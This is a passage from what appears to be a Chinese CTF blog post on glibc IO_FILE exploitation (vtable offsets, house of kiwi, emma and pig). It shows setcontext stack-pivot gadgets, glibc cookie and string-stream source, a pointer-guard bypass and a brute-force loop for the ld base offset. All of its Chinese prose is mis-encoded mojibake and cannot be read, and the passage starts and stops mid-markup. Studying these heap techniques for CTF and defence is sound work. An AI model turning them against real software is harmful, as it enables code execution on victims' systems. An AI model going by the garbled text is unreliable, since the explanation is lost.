class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure><p>‰ªéÊ≠§ÔºåËôöË°®ÊåáÈíà‰∏çËÉΩÈöèÊÑè‰º™ÈÄ†‰∫Ü„ÄÇÂ•ΩÂú®Ëøô‰∏™Ê£ÄÊµã‰æùÊóßÊØîËæÉÂÆΩÊ≥õÔºåÊàë‰ª¨‰æùÊóßÂèØ‰ª•‰øÆÊîπ<code>vtable</code>‰∏∫ËôöË°®ÂÜÖÁöÑÂÖ∂‰ªñÊåáÈíàÔºåÈÄöËøá‰∏ÄÂÆöÁöÑ<strong>ÂÅèÁßª</strong>Ë∞ÉÁî®<strong>ÂÖ∂‰ªñËôöË°®</strong>ÂÜÖÁöÑÂáΩÊï∞</p><p>‰æãÂ¶ÇÔºåÂéüÊú¨house of kiwi‰ºöËß¶Âèë<code>&lt;_IO_file_jumps+56&gt;</code>Â§ÑÁöÑ<code>_IO_new_file_xsputn</code>ÂáΩÊï∞ÔºåÊàë‰ª¨Â∏åÊúõË∞ÉÁî®<code>&lt;_IO_cookie_jumps+120&gt;</code>Â§ÑÁöÑ<code>_IO_cookie_write</code>ÂáΩÊï∞„ÄÇÂéüÊú¨<code>vtable</code>ÊåáÂêë<code>_IO_file_jumps</code>ÔºåË∞ÉÁî®ÂáΩÊï∞Êó∂Âàô‰ºöÂ∞ÜÊåáÈíàÂä†‰∏ä56„ÄÇÊàë‰ª¨Êää<code>vtable</code>ËÆæÁΩÆ‰∏∫<code>&lt;_IO_cookie_jumps+64&gt;</code>ÔºåÈÇ£‰πàÂú®ÂÆûÈôÖË∞ÉÁî®Êó∂ÔºåÂ∞±‰ºöË∞ÉÁî®Âà∞<code>&lt;_IO_cookie_jumps+64+56&gt;</code>Â§ÑÁöÑÁõÆÊ†áÂáΩÊï∞„ÄÇËøôÂ∞±ÊòØ<strong>ËôöË°®ÂÅèÁßª</strong>ÁöÑÊÄùÊÉ≥ÔºåÂ∞ÜÊâßË°åÊµÅÂä´ÊåÅÂà∞Â∑≤ÊúâÁöÑÂáΩÊï∞‰∏ä„ÄÇ</p><h1 id="Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®"><a href="#Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®" class="headerlink" title="Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®"></a>Êñ∞Êó∂‰ª£ÁöÑÈ´òÁâàÊú¨IOFILEÂà©Áî®</h1><p>È´òÁâàÊú¨‰∏ãÁöÑIOFILEÂà©Áî®ÊñπÂºèÂæàÂ§öÔºå‰ΩÜÂ§ßÂ§ö‰∏çÂ§ñ‰πéÈÉΩÊòØÂà©Áî®<strong>ËôöË°®ÂÅèÁßª</strong>ÁöÑÊÄùÊÉ≥‰º™ÈÄ†FILEÁªìÊûÑ‰ΩìÔºåÂπ∂ÈÄöËøá‰ª•‰∏äÁöÑÊñπÂºè<strong>Ëß¶ÂèëIO</strong>Ôºå‰ªéËÄågetshellÊàñËÄÖorw</p><p>ËøôÈáå‰ªãÁªçÂá†Áßç<del>Êàë‰ºöÁöÑ</del>ÊØîËæÉÂ•ΩÁî®ÁöÑ</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>Áõ∏ËæÉ‰∫é‰ªñÁöÑÂÆûÊàòÊÑè‰πâÔºåkiwiÊõ¥Â§ßÁöÑ‰ª∑ÂÄºÂèØËÉΩÂú®‰∫éÂÆÉÁöÑ‰∏§Êù°ÊÄùË∑ØÔºå‰∏ÄÊù°ÊòØ‰∏äÊñáÊèêÂà∞ÁöÑ<code>__malloc_assert</code>Ëß¶ÂèëIOÔºåÂè¶‰∏ÄÊù°ÂàôÊòØ<code>setcontext&lt;+61&gt;</code></p><p>ËøôÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÁöÑÁâáÊÆµÔºåÂÖºÂÖ∑<strong>Â∏ÉÁΩÆÂØÑÂ≠òÂô®„ÄÅÊ†àËøÅÁßª</strong>ÁöÑÂäüËÉΩÔºåÂ∏∏Â∏∏Âú®Ê≤ôÁõíÈôêÂà∂<code>execve</code>ÁöÑÊÉÖÂÜµ‰∏ãÁî®Êù•Êâì<strong>orwÈìæ</strong>ÔºåÊ±áÁºñ‰ª£Á†ÅÂ¶Ç‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;#Âü∫Êú¨‰∏äÈÉΩËÉΩË∑≥</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret</span><br></pre></td></tr></table></figure><p>Âõ¥Áªï<code>rdx</code>ËøõË°åÂèÇÊï∞ÁöÑÂ∏ÉÁΩÆÔºåÂ∞±ËÉΩËÆæÁΩÆÂ•ΩÂêÑ‰∏™ÂØÑÂ≠òÂô®</p><p>ËøôÈáåÊúÄÈáçË¶ÅÁöÑ‰∏§Êù°ÊòØ</p><p><code>[rdx+0xa0]</code> &#x3D;&gt; <code>rsp</code></p><p><code>[rdx+0xa8]</code> &#x3D;&gt; <code>rcx</code> &#x3D;&gt; <code>ret</code></p><p>Êàë‰ª¨ÈÄöÂ∏∏Â∞Ü<code>rcx</code>Â∏ÉÁΩÆ‰∏∫<code>ret</code>ÁöÑgadgetÔºåËøôÊ†∑Âú®ÊúÄÂêé<code>ret</code>ÁöÑÊó∂ÂÄôÂ∞±ËÉΩÂÆûÁé∞Ê†àËøÅÁßªÂà∞ËµãÁªô<code>rsp</code>ÁöÑÂú∞ÂùÄ‰∏ä</p><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>ÂèØ‰ª•ÁêÜËß£‰∏∫kiwiË°çÁîüÂá∫ÁöÑÊîªÂáªÊâãÊ≥ïÔºåÈúÄË¶Å‰ª•‰∏ã‰∏â‰∏™Êù°‰ª∂</p><ol><li><p>ÂèØ‰ª•<strong>‰ªªÊÑèÂÜô</strong>‰∏Ä‰∏™ÂèØÊéßÂú∞ÂùÄÔºàLargeBin Attack„ÄÅTcache Stashing Unlink Attack‚Ä¶Ôºâ</p></li><li><p>‰∏ÄÊ¨°<strong>‰ªªÊÑèÂú∞ÂùÄËØª</strong> Êàñ ÂÜçÊù•‰∏ÄÊ¨°<strong>‰ªªÊÑèÂÜô</strong></p></li><li><p>ÂèØ‰ª•<strong>Ëß¶Âèë IO ÊµÅ</strong>ÔºàFSOP„ÄÅhouse of kiwiÔºâ</p></li></ol><p>Âà©Áî®ÁöÑËôöË°®‰∏∫<code>_IO_cookie_jumps</code>ÔºåÂ≠òÂú®ÊãìÂ±ïÁªìÊûÑ<code>_IO_cookie_file</code>ÔºàËøòÊòØ<code>_IO_FILE_plus</code>Âä†ÈïøÁâàÔºâÔºåÂ§ö‰∫Ü‰∏Ä‰∏™ÂáΩÊï∞Ë°®ÔºåÂ≠òÂú®Âä´ÊåÅÁöÑÂèØËÉΩ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>ÈúÄË¶ÅË∞ÉÁî®ÁöÑËôöË°®ÂáΩÊï∞Â¶Ç‰∏ã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂÜô‰∫Ü4‰∏™ÂáΩÊï∞ÔºåÂÖ∂ÂÆûÂ§ßÂêåÂ∞èÂºÇÔºåÈÉΩË∞ÉÁî®‰∫Ü‰∏Ä‰∏™‰ªé<code>_IO_cookie_file</code>ÁªìÊûÑ‰ΩìÁöÑÂáΩÊï∞Ë°®‰∏≠ÂèñÂá∫ÁöÑÂáΩÊï∞ÊåáÈíàÔºå‰ª•<code>_IO_cookie_write</code>‰∏∫‰æã</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<span class="comment">//ÂèñÂá∫ÂáΩÊï∞ÊåáÈíà</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);<span class="comment">//ÊåáÈíà‰øùÊä§</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<span class="comment">//Ë∞ÉÁî®ÂáΩÊï∞</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄ‰º™ÈÄ†<code>_IO_cookie_file</code>ÁªìÊûÑ‰ΩìÁöÑÂáΩÊï∞Ë°®ÔºåÂ∞±ËÉΩË∞ÉÁî®‰ªªÊÑèÂáΩÊï∞„ÄÇÂêåÊó∂ËøôÈáåÁöÑ<code>rdi</code>ÊòØÂèØÊéßÁöÑ„ÄÇÂ¶ÇÊûúË¶ÅÊâìgetshellÔºåÂèØ‰ª•Áõ¥Êé•ÊûÑÈÄ†ÔºõÂ¶ÇÊûúË¶ÅÊâìorwÔºåÂèØ‰ª•Âà©Áî®libc‰∏≠‰∏Ä‰∏™gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure><p>ÂÆåÊàê‰ªéÂèØÊéß<code>rdi</code>Âà∞ÂèØÊéß<code>rdx</code>ÁöÑËΩ¨Êç¢</p><p>Ê≠§Â§ñÔºå<code>_IO_cookie_file</code>ÈáåÁöÑÂáΩÊï∞ÊåáÈíà‰∏çËÉΩÁõ¥Êé•‰º™ÈÄ†ÔºåÂõ†‰∏∫ÈªòËÆ§ÂºÄÂêØ‰∫ÜPTR_DEMANGLE ÔºàÊåáÈíà‰øùÊä§Ôºâ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p><code>__pointer_chk_guard</code>Â≠òÂú®‰∫éTLSÊÆµ‰∏äÔºåÂ∞ÜÂÖ∂RORÁßª‰Ωç0x11ÂêéÂÜç‰∏éÂ≠òÂÖ•ÁöÑÂú∞ÂùÄËøõË°åÂºÇÊàñ</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811213323111.png" alt="image-20230811213323111"></p><p><code>fs[0x30]</code>ÁöÑÂÄº‰Ωç‰∫é‰∏élibcÁõ∏ÈÇªÁöÑldÁ©∫Èó¥‰∏≠ÔºåËøô‰∏™‰ΩçÁΩÆË∑ùÁ¶ªlibcÂú∞ÂùÄÁöÑÂÅèÁßªÂõ∫ÂÆöÔºåÂèØËÉΩ‰∏éÊú¨Âú∞patchelfÂêé‰∏ç‰∏ÄËá¥ÔºåÂèØ‰ª•ÈÄöËøáÁàÜÁ†¥ÂæóÂà∞„ÄÇÂõ†‰∏∫ÂÅèÁßªÁöÑÂèòÂåñÂÄºÂæÄÂæÄÂú®Âú∞ÂùÄÊú´Â∞æÁöÑÁ¨¨Âõõ‰∏™„ÄÅÁ¨¨‰∫î‰∏™Êï∞ÔºàÊú´‰∏â‰Ωç‰∏çÂèòÔºâÔºåÂèØÁºñÂÜôÂ¶Ç‰∏ãËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            libc_base = <span class="number">0x1234</span></span><br><span class="line">            offset = <span class="number">0x6</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">            offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">            offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">            ld_base = libc_base + offset</span><br><span class="line">            log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">            <span class="comment"># your code</span></span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure><p>ËØ¶ÁªÜÈ¢òËß£ÂèØ‰ª•Áúã<a href="https://deepunk42.github.io/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/">Âè¶‰∏ÄÁØáÂçöÂÆ¢</a></p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><ul><li><p>Áî®‰∫éÁ®ãÂ∫è‰∏≠Âè™Êúâ<code>calloc</code>ËÄåÊ≤°Êúâ<code>malloc</code>ÁöÑÊÉÖÂÜµ</p></li><li><p>ÈÄöÂ∏∏ÈúÄË¶Å<strong>‰∏ÄÊ¨°largebin attack</strong>‰ª•ÂÆåÊàêtcache stashing unlink attackÁöÑÂáÜÂ§á</p></li><li><p>ÈúÄË¶Å<strong>‰∏ÄÊ¨°tcache stashing unlink attack</strong></p></li></ul><p>Ë∞ÉÁî®ËôöË°®<code>_IO_str_jumps</code> -&gt; <code>_IO_str_overflow</code>ÂáΩÊï∞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span 